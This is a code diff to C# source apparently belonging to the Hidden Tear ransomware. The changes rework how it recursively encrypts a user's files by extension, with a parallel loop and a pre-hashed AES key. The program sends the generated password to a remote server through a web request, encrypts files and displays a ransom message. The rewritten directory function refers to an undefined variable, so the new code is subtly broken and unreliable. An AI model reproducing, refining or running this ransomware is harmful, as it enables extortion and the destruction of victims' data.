@@ -1,4 +1,4 @@
-﻿/*
+/*
  _     _     _     _              _                  
 | |   (_)   | |   | |            | |                 
 | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
@@ -50,9 +50,7 @@ namespace hidden_tear
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
-
-
-
+        
         public Form1()
         {
             InitializeComponent();
@@ -71,6 +69,18 @@ namespace hidden_tear
         {
             Visible = false;
             Opacity = 100;
+        }
+
+        public void startAction()
+        {
+            string password = CreatePassword(15);
+            string path = "\\Desktop\\test";
+            string startPath = userDir + userName + path;
+            SendPassword(password);
+            encryptDirectory(startPath, SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password)));
+            messageCreator();
+            password = null;
+            System.Windows.Forms.Application.Exit();
         }
 
         //AES encryption algorithm
@@ -123,15 +133,32 @@ namespace hidden_tear
             var conent = new System.Net.WebClient().DownloadString(fullUrl);
         }
 
+        //encrypts target directory
+        public void encryptDirectory(string location, byte[] passwordBytes)
+        {
+            //extensions to be encrypt
+            var validExtensions = new[]
+            {
+                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
+            };
+            
+            var files = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
+            
+            Parallel.ForEach(files, file =>
+            {
+            string extension = Path.GetExtension(file);
+                if (validExtensions.Contains(extension))
+                {
+                    EncryptFile(file, passwordBytes);
+                }
+            });
+        }
+
         //Encrypts single file
-        public void EncryptFile(string file, string password)
+        public void EncryptFile(string file, byte[] passwordBytes)
         {
 
             byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
-            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
-
-            // Hash the password with SHA256
-            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
 
             byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
@@ -141,44 +168,6 @@ namespace hidden_tear
             
             
 
-        }
-
-        //encrypts target directory
-        public void encryptDirectory(string location, string password)
-        {
-            
-            //extensions to be encrypt
-            var validExtensions = new[]
-            {
-                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
-            };
-
-            string[] files = Directory.GetFiles(location);
-            string[] childDirectories = Directory.GetDirectories(location);
-            for (int i = 0; i < files.Length; i++){
-                string extension = Path.GetExtension(files[i]);
-                if (validExtensions.Contains(extension))
-                {
-                    EncryptFile(files[i],password);
-                }
-            }
-            for (int i = 0; i < childDirectories.Length; i++){
-                encryptDirectory(childDirectories[i],password);
-            }
-            
-            
-        }
-
-        public void startAction()
-        {
-            string password = CreatePassword(15);
-            string path = "\\Desktop\\test";
-            string startPath = userDir + userName + path;
-            SendPassword(password);
-            encryptDirectory(startPath,password);
-            messageCreator();
-            password = null;
-            System.Windows.Forms.Application.Exit();
         }
 
         public void messageCreator()
